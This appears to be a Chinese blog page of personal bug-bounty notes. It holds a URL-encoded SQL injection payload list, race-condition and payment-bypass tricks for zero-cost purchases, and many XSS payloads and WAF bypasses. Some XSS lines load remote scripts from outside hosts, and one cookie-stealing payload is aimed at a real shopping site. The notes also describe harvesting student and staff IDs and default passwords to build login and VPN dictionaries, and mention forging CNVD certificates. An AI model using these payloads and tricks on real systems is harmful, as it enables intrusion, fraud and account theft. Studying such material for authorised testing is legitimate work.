<h3 id="23-3-23-工具-amp-伪造cnvd"><a href="#23-3-23-工具-amp-伪造cnvd" class="headerlink" title="23_3_23 工具&amp;伪造cnvd"></a>23_3_23 工具&amp;伪造cnvd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">burp插件</span><br><span class="line">	✔collarborator				burp自带dnslog</span><br><span class="line">	AutoRepeater</span><br><span class="line">	✔HaE 						找敏感信息 配置	</span><br><span class="line">    	替换C:\Users\hyy\.config\HaE目录下config.yml</span><br><span class="line">	✔Xia SQL					有回显盲注工具</span><br><span class="line">		加上payload语句</span><br><span class="line">	✔Link Collection 提取api</span><br><span class="line">  	✔Turbo Intruder 并发</span><br><span class="line">	子域名挖掘工具</span><br><span class="line">		bbot</span><br><span class="line">		Fuzz Domain</span><br><span class="line">	WebScan gowitness截图工具</span><br><span class="line">	cnvd伪造电信 pdf</span><br><span class="line">	看页面源码确定是否html实体化---&gt;实体化了基本没戏</span><br><span class="line">	要用chatgpt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># xiaSQL payload</span><br><span class="line">&#x27;%20OR%20&#x27;x&#x27;=&#x27;x</span><br><span class="line">&quot;%20OR%20&quot;x&quot;=&quot;x</span><br><span class="line">&#x27;%20OR%201=1%20--</span><br><span class="line">&quot;%20OR%201=1%20--</span><br><span class="line">&#x27;%20OR%201=1;%20--</span><br><span class="line">&quot;%20OR%201=1;%20--</span><br><span class="line">&#x27;%20OR%201=1#</span><br><span class="line">&quot;%20OR%201=1#</span><br><span class="line">&#x27;%20OR%201=1%20LIMIT%201;%20--</span><br><span class="line">&quot;%20OR%201=1%20LIMIT%201;%20--</span><br><span class="line">&#x27;%20AND%201=0;%20--</span><br><span class="line">&quot;%20AND%201=0;%20--</span><br><span class="line">&#x27;%20AND%201=1;%20--</span><br><span class="line">&quot;%20AND%201=1;%20--</span><br><span class="line">&#x27;%20AND%20SLEEP(3);%20--</span><br><span class="line">&quot;%20AND%20SLEEP(3);%20--</span><br><span class="line">&#x27;%20AND%201=BENCHMARK(1000000,MD5(&#x27;a&#x27;));%20--</span><br><span class="line">&quot;%20AND%201=BENCHMARK(1000000,MD5(&#x27;a&#x27;));%20--</span><br><span class="line">&#x27;%20UNION%20SELECT%20@@version;%20--</span><br><span class="line">&quot;%20UNION%20SELECT%20@@version;%20--</span><br><span class="line">&#x27;%20UNION%20SELECT%201,2,3,4,5;%20--</span><br><span class="line">&quot;%20UNION%20SELECT%201,2,3,4,5;%20--</span><br><span class="line">&#x27;%20AND%201/1;%20--</span><br><span class="line">&#x27;%20AND%201/0;%20--</span><br><span class="line">&quot;%20AND%201/1;%20--</span><br><span class="line">&quot;%20AND%201/0;%20--</span><br><span class="line">&#x27;%20OR%201/1;%20--</span><br><span class="line">&#x27;%20OR%201/0;%20--</span><br><span class="line">&quot;%20OR%201/1;%20--</span><br><span class="line">&quot;%20OR%201/0;%20--</span><br><span class="line">&#x27;)%20AND%201/1;%20--</span><br><span class="line">&#x27;)%20AND%201/0;%20--</span><br><span class="line">&quot;)%20AND%201/1;%20--</span><br><span class="line">&quot;)%20AND%201/0;%20--</span><br><span class="line">&#x27;)%20OR%201/1;%20--</span><br><span class="line">&#x27;)%20OR%201/0;%20--</span><br><span class="line">&quot;)%20OR%201/1;%20--</span><br><span class="line">&quot;)%20OR%201/0;%20--</span><br><span class="line">1&#x27;%20and%20sleep(5)--%20</span><br><span class="line">1&#x27;&amp;&amp;sleep(3)-- &#x27;</span><br><span class="line"></span><br><span class="line">&#x27;||case when mid(databse(),1,1)=&#x27;d&#x27; then exp(710) else 0 end||&#x27;</span><br><span class="line">||case when mid(databse(),1,1)=&#x27;d&#x27; then exp(710) else 0 end||</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">✔1.每个src官网首页</span><br><span class="line">	https://www.baidu.com/more/</span><br><span class="line">	qq.com也是 把自己的业务摆出来了</span><br><span class="line">✔2.配合各种搜索引擎</span><br><span class="line">	fofa ssl 边缘资产打法</span><br><span class="line">		cert=&quot;baidu&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp;region=&quot;Beijing&quot;</span><br><span class="line">	语雀 google 敏感信息泄露</span><br><span class="line">	小蓝鸟</span><br><span class="line">	鹰图(奇安信)</span><br><span class="line">	众测</span><br><span class="line">        小蓝本</span><br><span class="line">        360威胁情报分析小蓝本</span><br><span class="line">        Packer-Fuzz ffufs ShuiZe自动扫描</span><br><span class="line">        零零信安 小公司后台</span><br><span class="line">        边缘资产 证书透明与SAN</span><br><span class="line">	python筛选去重</span><br><span class="line">3.借助工具</span><br><span class="line">	子域名收集</span><br><span class="line">		oneforall-master	推荐</span><br><span class="line">		layer子域名挖掘机</span><br><span class="line">4.灯塔等漏洞扫描</span><br><span class="line">	灯塔的规则要自己写 别人写的都被搞完了 隐藏js接口</span><br><span class="line">5.站点配置文件</span><br><span class="line">	xxx.com/crossdomain.xml</span><br><span class="line">6.查询DNS解析记录</span><br><span class="line">	目前大多数站点已经关闭 不适用</span><br><span class="line">✔7.各种企业查</span><br><span class="line">	小蓝本</span><br><span class="line">8.某公司小程序</span><br><span class="line">	微信搜公司名</span><br><span class="line">众测端口	</span><br><span class="line">先使用各种搜索引擎收集</span><br><span class="line">	oneforall fofa google bbot 子域名挖掘机 谷歌语法 小蓝本---&gt;python数据处理</span><br><span class="line">	小程序</span><br><span class="line"></span><br><span class="line">fofa 鹰图 shadon各种api接口写一个 结合成自己的工具 python数据清理</span><br><span class="line">挖掘机--&gt;子域名	oneforall google语法 bbot</span><br><span class="line">google</span><br><span class="line">	site:http://baidu.com -www</span><br><span class="line">小蓝本 微信小程序 公众号</span><br><span class="line"></span><br><span class="line">教育众测</span><br><span class="line">	sute:xxx.edu.com 学号|工号|sfz</span><br><span class="line">	site:edu.cn 初始密码</span><br><span class="line">		4级考试系统--&gt;获取信息</span><br><span class="line">	隐藏接口 浏览器f12 查看全部接口 可能泄露更多信息</span><br><span class="line">	生成字典 登录</span><br><span class="line">	越权找老师账号 个人信息档案 教务系统</span><br><span class="line">	接口返回的信息和页面加载的信息可能不一致</span><br><span class="line">		全局搜索/api----&gt;构造接口</span><br><span class="line">	接口文件下载</span><br><span class="line">	工号 手机号 姓名生成字典--&gt;vpn</span><br></pre></td></tr></table></figure>

<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">伪造卖片</span><br><span class="line">	片子放在百度网盘...</span><br><span class="line">1手情报</span><br><span class="line"></span><br><span class="line">真牛论坛</span><br><span class="line">小刀娱乐网</span><br><span class="line">卡盟</span><br><span class="line"></span><br><span class="line">咸鱼	百度 百度项目	京东活动 阿里活动</span><br></pre></td></tr></table></figure>



<h3 id="半自动开发"><a href="#半自动开发" class="headerlink" title="半自动开发"></a>半自动开发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">信息收集的过程贯穿始终</span><br><span class="line">	js逆向</span><br><span class="line">		js的signature变了大多是跟时间变了有关系</span><br><span class="line">		前端的signature的组成信息一定包含在发送的数据包中 和网页js的调用中 js加密一定可解</span><br><span class="line">	xxxcdn.test.com---&gt;cdn.test.com	cdn--&gt;静态文件加速</span><br><span class="line">	返回包302跳转改不让它跳转</span><br><span class="line">	</span><br><span class="line">burp插件参考网站</span><br><span class="line">	https://portswigger.net/burp/extender#SampleExtensions</span><br><span class="line">难点</span><br><span class="line">	1.api的调用分不清类和属性(函数)-&gt;参考案例查看所在类</span><br><span class="line">	2.图形化-&gt;https://wiki.python.org/jython/SwingExamples (jython)</span><br></pre></td></tr></table></figure>

<h3 id="功能点-视频站点"><a href="#功能点-视频站点" class="headerlink" title="功能点 视频站点"></a>功能点 视频站点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1.视频类站点</span><br><span class="line">	免费 付费 关注 收藏 充值vip 超前点播</span><br><span class="line">		观看历史 我的收藏--&gt;返回播放地址	</span><br><span class="line">		数据包对比</span><br><span class="line">		web换app</span><br><span class="line">		b站点和a站点来自一个数据库 </span><br><span class="line">			a要付费</span><br><span class="line">			b站点看视频免费</span><br><span class="line">			b的接口去看a--&gt;通杀</span><br><span class="line">			cdef...站点</span><br><span class="line">2.游戏娱乐站点</span><br><span class="line">3.社区服务类站点</span><br><span class="line">	评论 发表动态</span><br><span class="line">		越权 并发 xss sql注入</span><br><span class="line">4.云服务类站点</span><br><span class="line">	卖服务</span><br><span class="line">		支付</span><br><span class="line">	搭建</span><br><span class="line">		功能</span><br><span class="line">5.电商类站点</span><br><span class="line">6.金融 税务类站点</span><br><span class="line">	众测</span><br><span class="line">	</span><br><span class="line">优惠卷</span><br><span class="line">	并发 遍历新的优惠卷</span><br><span class="line">秒杀</span><br><span class="line">	改本地时间提前抢</span><br><span class="line">在线客服</span><br><span class="line">	xss</span><br><span class="line">点赞关注</span><br><span class="line">	越权</span><br><span class="line">验证码</span><br><span class="line">	改返回包试试</span><br><span class="line">用旧的cms版本</span><br><span class="line">	v3.2.0--&gt;v3.1.0</span><br><span class="line">同步</span><br><span class="line">	越权同步另一个账户的文件</span><br><span class="line">token可能是万能token</span><br><span class="line">上传文档</span><br><span class="line">	临时sts aksk</span><br><span class="line">下载 任意文件下载</span><br></pre></td></tr></table></figure>

<h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	竞争/并发漏洞 长属于逻辑业务中的漏洞类型，例如攻击者通过http/tcp请求达到多次获奖、多次收获、多次获赠等非正常逻辑所能触发的效果。</span><br><span class="line">	多线程 用一时间执行多于一个线程。</span><br><span class="line">	关系型数据库中，允许多个用户同时访问和更改共享数据的进程。SQL Server使用锁定以允许多个用户同时访问和更改共享数据而彼此之间不发生冲突。</span><br><span class="line">	</span><br><span class="line">	领取优惠卷时同时发送10次请求 服务器全都当成第一次的请求。</span><br><span class="line">	余额提现 并发</span><br><span class="line">	抽奖	怎么一直成为新用户 注销注册/换绑</span><br><span class="line">		新注册用户 仅限一次</span><br><span class="line">	转盘抽奖</span><br><span class="line">	点赞并发(低危)</span><br><span class="line">		微博抖音点赞高危代表热度高</span><br><span class="line">	粉丝并发(高危)</span><br><span class="line">		未鉴权</span><br><span class="line">			cookie 返回内容</span><br><span class="line">		抓取消关注 粉丝变成0</span><br><span class="line">		obj参数 callback参数 返回包对比</span><br><span class="line">	并发越权</span><br><span class="line">		有可能是条件竞争</span><br><span class="line">		低权限使用高权限功能</span><br><span class="line">	文件上传 条件竞争绕waf	xss并发绕waf</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">	判断服务器需要反应时间</span><br><span class="line">    场景</span><br><span class="line">	</span><br><span class="line">	点赞 提现</span><br><span class="line">	签到--&gt;尽量能搞到钱 提升危害</span><br><span class="line">	</span><br><span class="line">	万物皆可并发！！</span><br><span class="line">	</span><br><span class="line">	普通并发不能给高危-&gt;拓展危害</span><br><span class="line">	</span><br><span class="line">	send to intruder --&gt;&gt; extensions -&gt; send to turbo intruder</span><br><span class="line">		example/race.py</span><br><span class="line">	</span><br><span class="line">	积分抽奖想中什么中什么 -&gt;伪造sign</span><br><span class="line">	</span><br><span class="line">	并发越权</span><br><span class="line">		抓出接口 低权限并发执行高权限功能</span><br><span class="line">		条件竞争过waf</span><br><span class="line">			并发xss</span><br><span class="line">	</span><br><span class="line">	新人福利</span><br><span class="line">		换绑</span><br><span class="line">		注销注册</span><br><span class="line">	</span><br><span class="line">	优惠卷</span><br><span class="line">		并发</span><br><span class="line">		id规律 是否可以遍历处隐藏优惠卷</span><br><span class="line">		面额是否可以改</span><br><span class="line">		</span><br><span class="line">	接码平台，是指专门提供手机号为他人接收来自第三方平台验证码并将验证码提供给他人的资源平台</span><br><span class="line">	出高危</span><br><span class="line">*/</span><br><span class="line">爆破设置10秒(临界点)发一个包		(各个厂商接收的时间间隔不同)</span><br></pre></td></tr></table></figure>

<h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	服务器过分信任客户端 信息从客户端获取 导致漏洞</span><br><span class="line">	服务器未进行数据效验，数据库采用常规的int,float等，而没有采用无符号数</span><br><span class="line">	采用本地时间效验服务器时间</span><br><span class="line">	</span><br><span class="line">	支付三个步骤</span><br><span class="line">	1.选择物品下单</span><br><span class="line">	2.提交订单*(核心出问题的简短)</span><br><span class="line">	3.到达支付</span><br><span class="line">	</span><br><span class="line">	属性 总价、单价、数量、账号、余额、优惠、订单ID、时间天数</span><br><span class="line">	</span><br><span class="line">	如何实现0元购？</span><br><span class="line">	</span><br><span class="line">	sign加密几乎不可能成功</span><br><span class="line">	如果服务端过分信任客户端 那就把客户端所有交互都改一遍</span><br><span class="line">	单价</span><br><span class="line">	小金额商品买大金额商品 连带sign加密整体替换</span><br><span class="line">	</span><br><span class="line">	最大整数溢出</span><br><span class="line">	服务器限制了负数 超过则发生溢出 变为0</span><br><span class="line">	int -2147483648~2147483647</span><br><span class="line">	即2147483649=-2147483647</span><br><span class="line">	</span><br><span class="line">	云服务中常出现时间这个点</span><br><span class="line">	</span><br><span class="line">	数字换成字符串试试</span><br><span class="line">	</span><br><span class="line">	修改本地时间达到永久vip服务 签到时间</span><br><span class="line">	</span><br><span class="line">	加入购物车环节</span><br><span class="line">        value/count 1----&gt;&gt;&gt;&gt;0.00000000001g	1kb等于0.000001g</span><br><span class="line">        </span><br><span class="line">    优惠卷叠加</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">数据交互的地方</span><br><span class="line">    get post cookies headers</span><br><span class="line">    反馈与浏览</span><br><span class="line">    富文本编辑器</span><br><span class="line">    各类标签插入和自定义</span><br><span class="line">数据输出的地方</span><br><span class="line">    用户资料</span><br><span class="line">    关键词 标签 说明</span><br><span class="line">    文件上传</span><br><span class="line">payload</span><br><span class="line">    &lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;		引入外部js</span><br><span class="line">    &lt;img src=1 onerror=alert(/hack/)&gt;	对于数字可以不用引号</span><br><span class="line">    &lt;img src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;img dynsrc=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;img lowsrc=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;body onload=alert(1)&gt;</span><br><span class="line">    &lt;body background=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;iframe srcdoc=&quot;&lt;img src onerror=...&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">前端登录跳转 location</span><br><span class="line">    ../login?url(redirect_url)=...---&gt;javascript:alert(1)</span><br><span class="line">    	没有成功可能是正则表达式拦截了</span><br><span class="line">    	javascript://%0aalert(1)</span><br><span class="line">    	javascript://test.com/%0aalert(1)	#域名</span><br><span class="line">    </span><br><span class="line">    xss平台	https://xss.pt/xss.php?do=login</span><br><span class="line"></span><br><span class="line">    前端调试 断点</span><br><span class="line"></span><br><span class="line">    第二种		script标签里面</span><br><span class="line">        &lt;script&gt;var a = &#x27;&#x27;-alert(1)//test&#x27;&lt;/script&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">            window.nickName = &#x27;&#x27;;var s=document.createElement(&#x27;script&#x27;);document.body.appendChild(s);s.src=&#x27;https://m0qq.com/poc.js&#x27;;//&#x27;;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    文本编辑器字体写xss</span><br><span class="line"></span><br><span class="line">	xss:带出cookie 打破同源策略(共享cookie)</span><br><span class="line">	xss cors csrf相辅相成浏览器触发，用户与用户之间的攻击 无关服务器</span><br><span class="line">	同源策略 xss获取a.test.com的cookie--&gt;&gt;b.test.com的cookie---&gt;核心是执行js</span><br><span class="line">	json传参设计同源策略 不允许json传 json同源cookie过不来?????</span><br><span class="line">	</span><br><span class="line">	反射xss/domxss 存储xss svg/html文件上传</span><br><span class="line"></span><br><span class="line">	postmessage</span><br><span class="line">		https://www.cnblogs.com/piaomiaohongchen/p/14727871.html</span><br><span class="line">	</span><br><span class="line">	案例</span><br><span class="line">        1.文件上传的文件名也可以xss 网页放入这个文件触发</span><br><span class="line">        content-type text/html才能触发xss json格式触发不了?????</span><br><span class="line">        2.绕waf</span><br><span class="line">            拼接 (特定情况)</span><br><span class="line">            拼接打乱发送的顺序</span><br><span class="line">            alert(1)---&gt;&gt;&gt;top[`aler`+`t`](1)</span><br><span class="line">        	(alert)(1);</span><br><span class="line">        	&amp;it;img src=1 onerror&amp;equals;top[`aler`+`t`](1)&amp;gt;</span><br><span class="line">        3.发送payload返回利用的地方可能不止一处</span><br><span class="line">        	有的地方被转义有的可能没有被转义</span><br><span class="line">        	要分析js代码看它返回的地方有几处利用 前后端分离了</span><br><span class="line">		4.经常有的domxss函数setTimeout eval function location innerHTML</span><br><span class="line">			function a()&#123;alert(1)&#125;a()</span><br><span class="line">			location=&quot;javascript:alert(1)&quot;</span><br><span class="line">			location=&quot;javascript://%0aalert(1)&quot;</span><br><span class="line">			var xxx = &quot;\u003cimg src=c onerror=alert(1)\u003e&quot;</span><br><span class="line">			document.createElement(&quot;div&quot;).innerHTML=&quot;&lt;svg&gt;&quot;+xxx+&quot;&lt;/svg&gt;&quot;</span><br><span class="line">		5.https://fr.shopping.rakuten.com/connect?url=123123%22%3E%3Cimg+src=x+onpointerrawupdate=(prompt)(document.cookie)%3E</span><br><span class="line">			国外网站首先第一步数据交互的地方要找到 可以用view-source搜索 构造闭合</span><br><span class="line">			检测哪些关键字被转义 被waf拦掉 准备一个字典</span><br><span class="line">				&lt;u&gt;123&lt;/u&gt; &lt;script&gt; &lt;img&gt;</span><br><span class="line">			&lt;img&gt;中的on事件准备一个字典 使用chatgpt构造一个字典</span><br><span class="line">				onsubmit：在表单提交之前执行。</span><br><span class="line">                onkeydown/onkeypress/onkeyup：在按下/按住/释放键盘上的按键时执行。</span><br><span class="line">                onblur：当元素失去焦点时执行。</span><br><span class="line">                onchange：当元素的值更改时执行（例如文本框或下拉列表）。</span><br><span class="line">                oncontextmenu：右键单击时执行。</span><br><span class="line">                ondblclick：双击鼠标时执行。</span><br><span class="line">                onmousedown/onmouseup：在鼠标按钮被按下/释放时执行。</span><br><span class="line">                oninput：当用户输入值时触发（适用于&lt;textarea&gt;和&lt;input&gt;元素）</span><br><span class="line">                onerror：在加载图像或其他媒体文件时出现错误时触发</span><br><span class="line">                onresize：当元素大小调整时触发</span><br><span class="line">                ondrag：在元素拖动期间触发</span><br><span class="line">                onscroll：在元素滚动时触发</span><br><span class="line">                onpointerrawupdate 事件是一个指针事件，它在指针移动或触摸设备接收到新的原始输入数据时触发。这个事件提供了一种机制来跟踪鼠标或者触摸屏幕上的手指在运动过程中的位置和状态。</span><br><span class="line">				onpointermove 事件仅在指针移动时触发</span><br><span class="line">			此处waf应该是检测 prompt() ,使用(prompt)()绕过	此处(alert)()也可</span><br><span class="line">				prompt()函数是JavaScript中的一个内置函数，它用于在弹出窗口中向用户请求输入数据。它有两个参数：一个是窗口中要显示的文本内容，另一个是可选的默认值。当弹出窗口打开时，用户可以在其中输入数据，并单击“确定”或“取消”按钮。</span><br><span class="line">        6.input标签中过滤&lt; &gt;</span><br><span class="line">            echo &#x27;&lt;input value=&quot;&#x27;.&#x27;$name&#x27;.&#x27;&quot;&gt;&#x27;;</span><br><span class="line">            &quot; onfocus=alert(1)//		双引号是闭合</span><br><span class="line">            &quot; onclick=alert(1) &quot;</span><br><span class="line">		echo模板输出 字符的// 没有注释的作用</span><br><span class="line">	</span><br><span class="line">        7.aa bb可控 被html实体转义(转义完基本不能在除了html代码里执行)html实体转义唯独没有转义反斜杠\</span><br><span class="line">        echo &quot;&lt;script&gt;var name=\&quot;$name\&quot;;var age=\&quot;$age\&quot;;&lt;/script&gt;&quot;</span><br><span class="line">            var name=&quot;aa&quot;;var age=&quot;bb&quot;		必须在一行</span><br><span class="line">            ?name=ccc\&amp;age=-alert(1)//</span><br><span class="line">                var name=&quot;ccc\&quot;;var age=&quot;-alert(1)//&quot;</span><br><span class="line">        8.echo &quot;&lt;script&gt;var name=`$name`&lt;/script&gt;&quot;;</span><br><span class="line">            ?name=`-alert(1)//</span><br><span class="line">        9.&lt;a href=&quot;a&quot;onfocus=alert(1) autofocus//&quot;&gt;a&lt;/a&gt;</span><br><span class="line">            